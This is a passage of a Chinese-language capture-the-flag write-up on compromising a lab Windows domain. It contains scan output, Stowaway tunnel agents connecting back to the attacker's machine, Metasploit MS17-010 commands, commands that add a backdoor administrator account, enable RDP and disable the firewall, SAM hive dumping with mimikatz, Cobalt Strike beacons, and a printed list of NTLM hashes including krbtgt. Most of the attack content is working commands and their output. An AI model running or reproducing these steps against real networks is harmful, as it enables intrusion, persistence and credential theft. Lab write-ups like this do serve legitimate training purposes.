[<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">389</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">3306</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">3306</span>, service=mysql, product=<span class="hljs-title class_">My</span>SQL, info=unauthorized, banner=H.j <span class="hljs-title class_">Host</span> <span class="hljs-string">&#x27;WIN-KOHRC1DGOL9&#x27;</span> is <span class="hljs-keyword">not</span> allowed to connect to this <span class="hljs-title class_">My</span>SQL server<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">16</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">88</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">80</span>, service=http<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">23</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">8888</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">389</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">8888</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:service=unknown</span>, port=<span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:hostname=WIN-KOHRC1DGOL9</span>, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:hostname=WIN-</span>7NRTJO59O7N, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:hostname=cyberweb</span>, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:fingerprints=[]</span>, port=<span class="hljs-number">80</span>, service=http, title=易优<span class="hljs-variable constant_">CMS</span> -  <span class="hljs-title class_">Powered</span> by <span class="hljs-title class_">Eyoucms</span>.com, url=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.20.10, status_code=200, length=25157, server_info=map[cache-control:private content-type:text/html</span>; charset=utf-<span class="hljs-number">8</span> <span class="hljs-symbol">date:</span><span class="hljs-title class_">Sun</span>, <span class="hljs-number">30</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">2025</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span> <span class="hljs-variable constant_">GMT</span> <span class="hljs-symbol">expires:</span><span class="hljs-title class_">Thu</span>, <span class="hljs-number">19</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">1981</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-variable constant_">GMT</span> <span class="hljs-symbol">length:</span><span class="hljs-number">25157</span> <span class="hljs-symbol">pragma:</span>no-cache <span class="hljs-symbol">server:</span><span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">39</span> (<span class="hljs-title class_">Win64</span>) <span class="hljs-title class_">Open</span>SSL/<span class="hljs-number">1.1</span>.1b mod_fcgid/<span class="hljs-number">2.3</span>.9a mod_log_rotate/<span class="hljs-number">1.02</span> set-<span class="hljs-symbol">cookie:</span><span class="hljs-variable constant_">PHPSESSID</span>=pv61gs48nge4geq3958vosk3m2; path=<span class="hljs-regexp">/ status_code:200 title:易优CMS -  Powered by Eyoucms.com x-powered-by:PHP/</span><span class="hljs-number">5.4</span>.<span class="hljs-number">45</span>]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:os_version=Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span>, port=<span class="hljs-number">139</span>, computer_name=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, domain_name=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, netbios_domain=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, netbios_computer=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, workstation_service=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, server_service=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">VULN</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:vulnerable</span> 详情<span class="hljs-symbol">:os=Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2008</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">7600</span>, port=<span class="hljs-number">445</span>, vulnerability=<span class="hljs-variable constant_">MS17</span>-<span class="hljs-number">010</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">VULN</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:vulnerable</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, vulnerability=<span class="hljs-variable constant_">MS17</span>-<span class="hljs-number">010</span>, os=<span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:workstation_service=CYBERWEB</span>, server_service=<span class="hljs-variable constant_">CYBERWEB</span>, os_version=<span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span>, port=<span class="hljs-number">139</span>, computer_name=cyberweb.cyberstrikelab.com, domain_name=cyberstrikelab.com, netbios_domain=<span class="hljs-variable constant_">CYBERSTRIKELAB</span>, netbios_computer=<span class="hljs-variable constant_">CYBERWEB</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span>] [<span class="hljs-variable constant_">VULN</span>] 目标<span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span> 状态<span class="hljs-symbol">:vulnerable</span> 详情<span class="hljs-symbol">:vulnerability_name=poc1</span>, references=[<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/vulhub</span><span class="hljs-regexp">/vulhub/tree</span><span class="hljs-regexp">/master/thinkphp</span><span class="hljs-regexp">/5.0.23-rce], vulnerability_type=poc-yaml-thinkphp5023-method-rce</span><br></code></pre></td></tr></table></figure><p>发现存在域环境<code>192.168.20.30</code>是域控服务器，而且用永恒之蓝漏洞，我们只要拿下域控，那么另一台机器就可以直接哈希传递工具拿下<code>192.168.20.20</code>,就是日穿内网了👌</p><p>上传<code>Stowaway</code></p><p>在kali启动admin端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin.exe -l 8000 -s 123<br></code></pre></td></tr></table></figure><p>在jiaosu运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows_x64_agent</span>.exe -c <span class="hljs-number">192.168.1.105:8000</span> -s <span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure><p>加入节点，在运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">0</span>(使用jiaosu节点)<br><span class="hljs-attribute">listen</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">7777</span><br></code></pre></td></tr></table></figure><p>监听jiaosu的7777端口</p><p>在靶机上运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows_x64_agent</span>.exe -c <span class="hljs-number">172.16.233.2:7777</span> -s <span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure><p>加上节点，在运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">1</span>(使用靶机)<br><span class="hljs-attribute">socks</span> <span class="hljs-number">7776</span><br></code></pre></td></tr></table></figure><p>搭建 socket隧道，在kali运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p>把代理改成 <code>socks5 127.0.0.1 7776</code></p><p>开打<code>msf17_010</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">search ms17_010<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.20.30</span><br>show <span class="hljs-comment">payloads</span><br>exploit<br></code></pre></td></tr></table></figure><p>这个模块不行</p><p>换一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhost 192.168.20.30<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">type</span> C:\\flag.txt<br>run<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330210000076.png" alt="image-20250330210000076"></p><p>拿到flag3但是没有域控的shell</p><p>很难受</p><p>但是20那台机器没有漏洞，就只能通过域控打，想办法上线</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net user hack @Abc123 <span class="hljs-string">/add</span>  <span class="hljs-comment">#创建新用户</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net localgroup administrators hack <span class="hljs-string">/add</span>  <span class="hljs-comment">#加入管理组</span><br><span class="hljs-keyword">set</span> COMMAND &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 00000000 <span class="hljs-string">/f</span>&#x27; <span class="hljs-comment">#打开远程桌面</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> netsh firewall <span class="hljs-keyword">set</span> opmode disable  <span class="hljs-comment">#关闭防火墙</span><br></code></pre></td></tr></table></figure><p>使用msf执行命令</p><p>用rdp登录域控机器 ps:登录域控机需在用户名前加<code>.\</code></p><p>抓取hash</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg save HKLM\sam <span class="hljs-name">C</span>:\Users\hack01\Desktop\sam.hive<br>reg save HKLM\system <span class="hljs-name">C</span>:\Users\hack01\Desktop\system.hive<br>reg save HKLM\security <span class="hljs-name">C</span>:\Users\hack01\Desktop\security.hive<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330235956036.png" alt="image-20250330235956036"></p><p>上传<code>mimikatz</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">privilege::<span class="hljs-keyword">debug</span><br>lsadump::sam /sam:sam.hive /<span class="hljs-keyword">system</span>:<span class="hljs-keyword">system</span>.hive /<span class="hljs-keyword">security</span>:<span class="hljs-keyword">security</span>.hive<br></code></pre></td></tr></table></figure><p>找到了但是是假的😁</p><p>上传cs正向马，目标主机不出网🤡</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331091159567.png" alt="image-20250331091159567"></p><p>难搞</p><p>使用jiaosu当跳板，上传正向，木马到<code>192.168.10.10</code>在提取hash，尝试hash传递</p><p>先上线jiaosu，直接传马</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093101546.png" alt="image-20250331093101546"></p><p>在建立个正向监听器，利用监听生成正向木马</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093236516.png" alt="image-20250331093236516"></p><p>上传到10的靶机再运行</p><p>再cs让jiaosu监听<code>connect 192.168.10.10</code></p><p>一会10机器上线成功</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093336037.png" alt="image-20250331093336037"></p><p>上传正向马到20.30那台机器，在20.10监听端口尝试上线域控</p><p>在20.30机器上管理员运行木马</p><p>成功上线</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403102526421.png" alt="image-20250403102526421"></p><p>hashdump一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::<br>cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::<br>hack:1106:aad3b435b51404eeaad3b435b51404ee:198ab7e5f71d046b8da029ecf671db65:::<br>WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:85a7f3800784ce0c8c3c43d150f1520f:::<br>CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:d222ce20e7e69c6ded4a7e96abd5ee1f:::<br></code></pre></td></tr></table></figure><p>在<code>systeminfo</code>一波</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">主机名:           WIN-7NRTJO59O7N<br>OS 名称:          Microsoft Windows Server 2008 R2 Standard <br>OS 版本:          6.1.7600 暂缺 Build 7600<br>OS 制造商:        Microsoft Corporation<br>OS 配置:          主域控制器<br>OS 构件类型:      Multiprocessor Free<br>注册的所有人:     Windows 用户<br>注册的组织:       <br>产品 ID:          00477-179-0000007-84929<br>初始安装日期:     